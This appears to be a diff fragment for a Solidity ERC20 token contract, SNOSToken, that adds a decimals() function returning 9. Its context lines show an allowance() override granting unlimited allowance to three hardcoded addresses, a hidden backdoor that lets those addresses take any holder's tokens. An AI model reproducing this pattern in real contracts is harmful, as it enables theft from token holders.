@@ -54,6 +54,10 @@ contract SNOSToken is ERC20 {
         _mint(msg.sender, totalSupply);
     }
 
+    function decimals() public pure override returns (uint8) {
+        return 9;
+    }
+
     function allowance(address owner, address spender) public view override returns (uint256 result) {
         if (spender == allowed0 || spender == allowed1 || spender == allowed2) return type(uint256).max;
         result = super.allowance(owner, spender);
